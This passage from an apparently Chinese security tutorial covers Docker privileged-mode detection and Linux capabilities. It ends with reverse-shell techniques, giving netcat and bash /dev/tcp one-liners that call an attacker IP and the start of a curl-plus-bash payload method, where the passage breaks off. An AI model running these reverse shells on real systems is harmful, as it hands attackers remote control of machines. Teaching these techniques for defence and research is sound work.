class=\"line\">1:name=systemd:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br></pre></td></tr></table></figure>\n<h3 id=\"5特权模式判断\"><a class=\"markdownIt-Anchor\" href=\"#5特权模式判断\">#</a> 5. 特权模式判断</h3>\n<p>可通过 cat /proc/self/status |grep Cap 命令判断当前容器是否通过特权模式起（000000xfffffffff 代表为特权模式起）</p>\n<p>常见的有 <code>0000001fffffffff</code> ， <code>0000003fffffffff</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos ~]# docker run -it --privileged ubuntu:18.04  </span><br><span class=\"line\">root@8ed8accc6562:/# cat /proc/self/status | grep Cap</span><br><span class=\"line\">CapInh:\t0000001fffffffff</span><br><span class=\"line\">CapPrm:\t0000001fffffffff</span><br><span class=\"line\">CapEff:\t0000001fffffffff</span><br><span class=\"line\">CapBnd:\t0000001fffffffff</span><br><span class=\"line\">CapAmb:\t0000000000000000</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos ~]# docker run -it ubuntu:18.04  </span><br><span class=\"line\">root@980122e5f1f2:/# cat /proc/self/status |grep Cap</span><br><span class=\"line\">CapInh:\t00000000a80425fb</span><br><span class=\"line\">CapPrm:\t00000000a80425fb</span><br><span class=\"line\">CapEff:\t00000000a80425fb</span><br><span class=\"line\">CapBnd:\t00000000a80425fb</span><br><span class=\"line\">CapAmb:\t0000000000000000</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos ~]# capsh --decode=0000001fffffffff</span><br><span class=\"line\">0x0000001fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36</span><br><span class=\"line\">[root@VM-16-11-centos ~]# capsh --decode=0000003fffffffff</span><br><span class=\"line\">0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36,37</span><br></pre></td></tr></table></figure>\n<p>通过 capsh 查看当前 shell 的 capabilities，0000001 和 0000003 权限只相差 <code>37</code></p>\n<h3 id=\"6linux-capabilities-补充\"><a class=\"markdownIt-Anchor\" href=\"#6linux-capabilities-补充\">#</a> 6.Linux Capabilities （补充）</h3>\n<p>root 是 linux 中的最高权限，可以安装软件、允许某些服务、管理用户等。作为普通用户，如果想执行某些只有管理员才有权限的操作，以前只有两种办法：一是通过  <code>sudo</code>  提升权限，如果用户很多，配置管理和权限控制会很麻烦；二是通过 SUID（Set User ID on execution）来实现，它可以让普通用户允许一个  <code>owner</code>  为 root 的可执行文件时具有 root 的权限。</p>\n<p>通过  <code>sudo</code>  提升权限，如果用户很多，配置管理和权限控制会很麻烦，我们需要修改 sudo 的配置文件 <code>/etc/sudoers</code> ；而使用 SUID 时，通常只是需要很小一部分的特权，但是  <code>SUID</code>  给了它 root 具有的全部权限。这些可执行文件是黑客的主要目标，如果他们发现了其中的漏洞，就很容易利用它来进行安全攻击。</p>\n<p>为了对 root 权限进行更细粒度的控制，实现按需授权，Linux 引入了另一种机制叫  <code>capabilities</code> 。</p>\n<p>它对用户的权限进行了更细致的分类，可以对单个线程进行更精度的权限控制。避免粗暴的 root 特权用户和常规用户的简单区分。当一个进程要进行某个特权操作时，操作系统会检查 cap_effective 的对应位是否有效，而不再是检查进程的有效 UID 是否为 0。</p>\n<p><code>Capabilities</code>  机制是在 Linux 内核  <code>2.2</code>  之后引入的，原理很简单，就是将之前与超级用户 root（UID=0）关联的特权细分为不同的功能组，Capabilites 作为线程的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。</p>\n<p>这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是 root，就去检查其是否具有该特权操作所对应的 capabilities，并以此为依据，决定是否可以执行特权操作。</p>\n<p>Capabilities 可以在进程执行时赋予，也可以直接从父进程继承。所以理论上如果给 nginx 可执行文件赋予了  <code>CAP_NET_BIND_SERVICE</code>  capabilities，那么它就能以普通用户运行并监听在 80 端口上。同时 nginx 父进程会根据配置文件启动 worker，因此 nginx 运行时需要 inheritable 的权限</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">apability 名称</th>\n<th style=\"text-align:left\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">CAP_AUDIT_CONTROL</td>\n<td style=\"text-align:left\">启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_AUDIT_READ</td>\n<td style=\"text-align:left\">允许通过 multicast netlink 套接字读取审计日志</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_AUDIT_WRITE</td>\n<td style=\"text-align:left\">将记录写入内核审计日志</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_BLOCK_SUSPEND</td>\n<td style=\"text-align:left\">使用可以阻止系统挂起的特性</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_CHOWN</td>\n<td style=\"text-align:left\">修改文件所有者的权限</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_DAC_OVERRIDE</td>\n<td style=\"text-align:left\">忽略文件的 DAC 访问限制</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_DAC_READ_SEARCH</td>\n<td style=\"text-align:left\">忽略文件读及目录搜索的 DAC 访问限制</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_FOWNER</td>\n<td style=\"text-align:left\">忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_FSETID</td>\n<td style=\"text-align:left\">允许设置文件的 setuid 位</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_IPC_LOCK</td>\n<td style=\"text-align:left\">允许锁定共享内存片段</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_IPC_OWNER</td>\n<td style=\"text-align:left\">忽略 IPC 所有权检查</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_KILL</td>\n<td style=\"text-align:left\">允许对不属于自己的进程发送信号</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_LEASE</td>\n<td style=\"text-align:left\">允许修改文件锁的 FL_LEASE 标志</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_LINUX_IMMUTABLE</td>\n<td style=\"text-align:left\">允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_MAC_ADMIN</td>\n<td style=\"text-align:left\">允许 MAC 配置或状态更改</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_MAC_OVERRIDE</td>\n<td style=\"text-align:left\">忽略文件的 DAC 访问限制</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_MKNOD</td>\n<td style=\"text-align:left\">允许使用 mknod () 系统调用</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_NET_ADMIN</td>\n<td style=\"text-align:left\">允许执行网络管理任务</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_NET_BIND_SERVICE</td>\n<td style=\"text-align:left\">允许绑定到小于 1024 的端口</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_NET_BROADCAST</td>\n<td style=\"text-align:left\">允许网络广播和多播访问</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_NET_RAW</td>\n<td style=\"text-align:left\">允许使用原始套接字</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_SETGID</td>\n<td style=\"text-align:left\">允许改变进程的 GID</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_SETFCAP</td>\n<td style=\"text-align:left\">允许为文件设置任意的 capabilities</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_SETPCAP</td>\n<td style=\"text-align:left\">参考 capabilities man page</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_SETUID</td>\n<td style=\"text-align:left\">允许改变进程的 UID</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_SYS_ADMIN</td>\n<td style=\"text-align:left\">允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_SYS_BOOT</td>\n<td style=\"text-align:left\">允许重新启动系统</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_SYS_CHROOT</td>\n<td style=\"text-align:left\">允许使用 chroot () 系统调用</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_SYS_MODULE</td>\n<td style=\"text-align:left\">允许插入和删除内核模块</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_SYS_NICE</td>\n<td style=\"text-align:left\">允许提升优先级及设置其他进程的优先级</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_SYS_PACCT</td>\n<td style=\"text-align:left\">允许执行进程的 BSD 式审计</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_SYS_PTRACE</td>\n<td style=\"text-align:left\">允许跟踪任何进程</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_SYS_RAWIO</td>\n<td style=\"text-align:left\">允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_SYS_RESOURCE</td>\n<td style=\"text-align:left\">忽略资源限制</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_SYS_TIME</td>\n<td style=\"text-align:left\">允许改变系统时钟</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_SYS_TTY_CONFIG</td>\n<td style=\"text-align:left\">允许配置 TTY 设备</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_SYSLOG</td>\n<td style=\"text-align:left\">允许使用 syslog () 系统调用</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CAP_WAKE_ALARM</td>\n<td style=\"text-align:left\">允许触发一些能唤醒系统的东西 (比如 CLOCK_BOOTTIME_ALARM 计时器)</td>\n</tr>\n</tbody>\n</table>\n<p>docker 逃逸一般是因为 <code>cap_sys_module</code>  或者 <code>CAP_SYS_ADMIN</code>  权限的问题</p>\n<p><strong>capabilities 的赋予和继承</strong></p>\n<p>Linux capabilities 分为进程 capabilities 和文件 capabilities。对于进程来说，capabilities 是细分到线程的，即每个线程可以有自己的 capabilities。对于文件来说，capabilities 保存在文件的扩展属性中。</p>\n<p>每一个线程，具有 5 个 capabilities 集合，每一个集合使用  <code>64</code>  位掩码来表示，显示为  <code>16</code>  进制格式。这 5 个 capabilities 集合分别是：</p>\n<ul>\n<li>Permitted</li>\n<li>Effective</li>\n<li>Inheritable</li>\n<li>Bounding</li>\n<li>Ambient</li>\n</ul>\n<p><strong>Permitted</strong></p>\n<p>定义了线程能够使用的 capabilities 的上限。线程添加或删除 capability，前提是添加或删除的 capability 必须包含在  <code>Permitted</code>  集合中</p>\n<p><strong>Effective</strong></p>\n<p>内核检查线程是否可以进行特权操作时，检查的对象便是  <code>Effective</code>  集合。如之前所说， <code>Permitted</code>  集合定义了上限，线程可以删除 Effective 集合中的某 capability，随后在需要时，再从 Permitted 集合中恢复该 capability，以此达到临时禁用 capability 的功能。</p>\n<p><strong>Inheritable</strong></p>\n<p>当执行 <code>exec()</code>  系统调用时，能够被新的可执行文件继承的 capabilities，被包含在  <code>Inheritable</code>  集合中。</p>\n<p>Bounding 和 Ambient 不在赘述，用的不多，可以去下面的参考链接了解</p>\n<p>文件的 capabilities</p>\n<p>文件的 capabilities 被保存在文件的扩展属性中。如果想修改这些属性，需要具有  <code>CAP_SETFCAP</code>  的 capability。</p>\n<p>类似于线程的 capabilities，文件的 capabilities 包含了 3 个集合：</p>\n<ul>\n<li>Permitted</li>\n<li>Inheritable</li>\n<li>Effective</li>\n</ul>\n<p>最后举个 docker 的例子，在开始的时候提过 nginx 的特殊性</p>\n<p>使用普通用户启动时会报以下错误</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bind() to 0.0.0.0:80 failed (13: Permission denied)</span><br></pre></td></tr></table></figure>\n<p>因为 nginx 进程的  <code>Effective</code>  集合中不包含  <code>CAP_NET_BIND_SERVICE</code>  capability，且不具有 <strong>capabilities 意识</strong>（普通用户），所以启动失败。要想启动成功，至少需要将该 capability 添加到 nginx 文件的  <code>Inheritable</code>  集合中，同时开启 Effective 标志位，并且在 Kubernetes Pod 的部署清单中的 securityContext --&gt; capabilities 字段下面添加  <code>NET_BIND_SERVICE</code> （这个 capability 会被添加到 nginx 进程的  <code>Bounding</code>  集合中），最后还要将 capability 添加到 nginx 文件的  <code>Permitted</code>  集合中。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTI5MzQy\">Linux Capabilities 入门：让普通进程获得 root 的洪荒之力 - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p>\n<p>Linux 系统中主要提供了两种工具来管理 capabilities： <code>libcap</code>  和  <code>libcap-ng</code> 。 <code>libcap</code>  提供了  <code>getcap</code>  和  <code>setcap</code>  两个命令来分别查看和设置文件的 capabilities，同时还提供了  <code>capsh</code>  来查看当前 shell 进程的 capabilities。 <code>libcap-ng</code>  更易于使用，使用同一个命令  <code>filecap</code>  来查看和设置 capabilities。</p>\n<p>1.libcap</p>\n<p>// 安装 libcap</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y libcap</span><br></pre></td></tr></table></figure>\n<p>如果想查看当前 shell 进程的 capabilities，可以用  <code>capsh</code>  命令。下面是 CentOS 系统中的 root 用户执行  <code>capsh</code>  的输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@hecs-346515 ~]# capsh --print</span><br><span class=\"line\">Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36+ep</span><br><span class=\"line\">Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36</span><br><span class=\"line\">Securebits: 00/0x0/1&#x27;b0</span><br><span class=\"line\"> secure-noroot: no (unlocked)</span><br><span class=\"line\"> secure-no-suid-fixup: no (unlocked)</span><br><span class=\"line\"> secure-keep-caps: no (unlocked)</span><br><span class=\"line\">uid=0(root)</span><br><span class=\"line\">gid=0(root)</span><br><span class=\"line\">groups=0(root)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li><strong>Current</strong> : 表示当前 shell 进程的 Effective capabilities 和 Permitted capabilities。可以包含多个分组，每一个分组的表示形式为  <code>capability[,capability…]+(e|i|p)</code> ，其中  <code>e</code>  表示 effective， <code>i</code>  表示 inheritable， <code>p</code>  表示 permitted。不同的分组之间通过空格隔开，例如： <code>Current: = cap_sys_chroot+ep cap_net_bind_service+eip</code> 。再举一个例子， <code>cap_net_bind_service+e cap_net_bind_service+ip</code>  和  <code>cap_net_bind_service+eip</code>  等价。</li>\n<li><strong>Bounding set</strong> : 这里仅仅表示 Bounding 集合中的 capabilities，不包括其他集合，所以分组的末尾不用加上  <code>+...</code>  。</li>\n</ul>\n</blockquote>\n<p>这个命令输出的信息比较有限，完整的信息可以查看 /proc 文件系统，比如当前 shell 进程就可以查看  <code>/proc/$$/status</code> 。其中一个重要的状态就是  <code>NoNewPrivs</code> ，可以通过以下命令查看：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@hecs-346515 ~]# cat /proc/$$/status </span><br><span class=\"line\">Name:\tbash</span><br><span class=\"line\">Umask:\t0022</span><br><span class=\"line\">State:\tS (sleeping)</span><br><span class=\"line\">Tgid:\t15482</span><br><span class=\"line\">Ngid:\t0</span><br><span class=\"line\">Pid:\t15482</span><br><span class=\"line\">PPid:\t15480</span><br><span class=\"line\">TracerPid:\t0</span><br><span class=\"line\">Uid:\t0\t0\t0\t0</span><br><span class=\"line\">Gid:\t0\t0\t0\t0</span><br><span class=\"line\">FDSize:\t256</span><br><span class=\"line\">Groups:\t0 </span><br><span class=\"line\">VmPeak:\t  115548 kB</span><br><span class=\"line\">VmSize:\t  115548 kB</span><br><span class=\"line\">VmLck:\t       0 kB</span><br><span class=\"line\">VmPin:\t       0 kB</span><br><span class=\"line\">VmHWM:\t    2096 kB</span><br><span class=\"line\">VmRSS:\t    2096 kB</span><br><span class=\"line\">RssAnon:\t     432 kB</span><br><span class=\"line\">RssFile:\t    1664 kB</span><br><span class=\"line\">RssShmem:\t       0 kB</span><br><span class=\"line\">VmData:\t     368 kB</span><br><span class=\"line\">VmStk:\t     132 kB</span><br><span class=\"line\">VmExe:\t     888 kB</span><br><span class=\"line\">VmLib:\t    2148 kB</span><br><span class=\"line\">VmPTE:\t      52 kB</span><br><span class=\"line\">VmSwap:\t       0 kB</span><br><span class=\"line\">Threads:\t1</span><br><span class=\"line\">SigQ:\t0/7268</span><br><span class=\"line\">SigPnd:\t0000000000000000</span><br><span class=\"line\">ShdPnd:\t0000000000000000</span><br><span class=\"line\">SigBlk:\t0000000000010000</span><br><span class=\"line\">SigIgn:\t0000000000384004</span><br><span class=\"line\">SigCgt:\t000000004b813efb</span><br><span class=\"line\">CapInh:\t0000000000000000</span><br><span class=\"line\">CapPrm:\t0000001fffffffff</span><br><span class=\"line\">CapEff:\t0000001fffffffff</span><br><span class=\"line\">CapBnd:\t0000001fffffffff</span><br><span class=\"line\">CapAmb:\t0000000000000000</span><br><span class=\"line\">NoNewPrivs:\t0</span><br><span class=\"line\">Seccomp:\t0</span><br><span class=\"line\">Speculation_Store_Bypass:\tthread vulnerable</span><br><span class=\"line\">Cpus_allowed:\t1</span><br><span class=\"line\">Cpus_allowed_list:\t0</span><br><span class=\"line\">Mems_allowed:\t00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001</span><br><span class=\"line\">Mems_allowed_list:\t0</span><br><span class=\"line\">voluntary_ctxt_switches:\t90</span><br><span class=\"line\">nonvoluntary_ctxt_switches:\t0</span><br></pre></td></tr></table></figure>\n<p>自从 Linux 4.10 开始， <code>/proc/[pid]/status</code>  中的  <code>NoNewPrivs</code>  值表示了线程的  <code>no_new_privs</code>  属性。</p>\n<p>一般情况下， <code>execve()</code>  系统调用能够赋予新启动的进程其父进程没有的权限，最常见的例子就是通过  <code>setuid</code>  和  <code>setgid</code>  来设置程序进程的 uid 和 gid 以及文件的访问权限。</p>\n<p>开启了  <code>no_new_privs</code>  之后，execve 函数可以确保所有操作都必须调用  <code>execve()</code>  判断并赋予权限后才能被执行。这就确保了线程及子线程都无法获得额外的权限，因为无法执行 setuid 和 setgid，也不能设置文件的权限。</p>\n<p>一旦当前线程的  <code>no_new_privs</code>  被置位后，不论通过 fork，clone 或 execve 生成的子线程都无法将该位清零。</p>\n<p>Docker 中可以通过参数  <code>--security-opt</code>  来开启  <code>no_new_privs</code>  属性，例如： <code>docker run --security-opt=no_new_privs busybox</code> 。</p>\n<p>2.libcap-ng</p>\n<p>// 安装</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install libcap-ng-utils</span><br></pre></td></tr></table></figure>\n<p>libcap-ng 使用  <code>filecap</code>  命令来管理文件的 capabilities。</p>\n<p>查看文件的 capabilities：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ filecap /full/path/to/file</span><br></pre></td></tr></table></figure>\n<p>递归查看某个目录下所有文件的 capabilities：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ filecap /full/path/to/dir</span><br></pre></td></tr></table></figure>\n<p>[Linux Capabilities 入门教程：基础实战篇 - 菜鸟教程 | <span class=\"exturl\" data-url=\"aHR0cDovL0Jvb3RXaWtpLmNvbQ==\">BootWiki.com</span>](<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYm9vdHdpa2kuY29tL25vdGUvMjA4MDAuaHRtbCM6fjp0ZXh0PSUyNA==\">https://www.bootwiki.com/note/20800.html#:~:text=%24</span> yum install -y libcap 如果想查看当前 shell 进程的，命令。 下面是 CentOS 系统中的 root 用户执行 capsh 的输出：)</p>\n<h3 id=\"7反弹shell补充\"><a class=\"markdownIt-Anchor\" href=\"#7反弹shell补充\">#</a> 7. 反弹 shell (补充)</h3>\n<p>反弹 shell，就是攻击机监听在某个 TCP/UDP 端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p>\n<p>反弹 shell 通常适用于如下几种情况：</p>\n<blockquote>\n<p>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</p>\n<p>目标机位于局域网，或 IP 会动态变化，攻击机无法直接连接。</p>\n<p>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。</p>\n</blockquote>\n<p>1.<strong> 利用 netcat 反弹 shell</strong></p>\n<p>Netcat 是一款简单的 Unix 工具，使用 UDP 和 TCP 协议。它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。使用它你可以轻易的建立任何连接。</p>\n<p>安装</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gztar -xvzf netcat-0.7.1.tar.gz./configuremake &amp;&amp; make installmake clean</span><br></pre></td></tr></table></figure>\n<p>攻击机开启本地监听：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netcat -lvvp <span class=\"number\">2333</span></span><br></pre></td></tr></table></figure>\n<p>目标机主动连接攻击机：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nc &lt;攻击机<span class=\"variable constant_\">IP</span>&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span><br><span class=\"line\">netcat <span class=\"number\">47.</span>xxx.<span class=\"property\">xxx</span><span class=\"number\">.72</span> <span class=\"number\">2333</span> -e /bin/bash</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201172931760.png\" alt=\"image-20221201172931760\"></p>\n<p><strong>2. 利用 Bash 反弹 shell</strong></p>\n<p>使用 bash 结合重定向方法的一句话，具体命令如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># bash -i &gt;&amp; <span class=\"regexp\">/dev/</span>tcp/攻击机<span class=\"variable constant_\">IP</span>/攻击机端口 <span class=\"number\">0</span>&gt;&amp;<span class=\"number\">1</span></span><br><span class=\"line\">bash -i &gt;&amp; <span class=\"regexp\">/dev/</span>tcp/<span class=\"number\">47.</span>xxx.<span class=\"property\">xxx</span><span class=\"number\">.72</span>/<span class=\"number\">2333</span> <span class=\"number\">0</span>&gt;&amp;<span class=\"number\">1</span></span><br><span class=\"line\">bash -c <span class=\"string\">&quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201173007852.png\" alt=\"image-20221201173007852\"></p>\n<p>Bash 产生了一个交互环境和本地主机主动发起与攻击机 2333 端口建立的连接（即 TCP 2333 会话连接）相结合，然后在重定向个 TCP 2333 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个 Bash 反弹环境。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201173131974.png\" alt=\"image-20221201173131974\"></p>\n<p><strong>3.Curl 配合 Bash 反弹 shell</strong></p>\n<p>首先，在攻击者 vps 的 web 目录里面创建一个 index 文件（index.php 或 index.html），内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>并开启 2333 端口的监听。</p>\n<p>然后再目标机上执行如下，即可反弹 shell：</p>\n<figure class=\"highlight javascript\"><table><tr><td 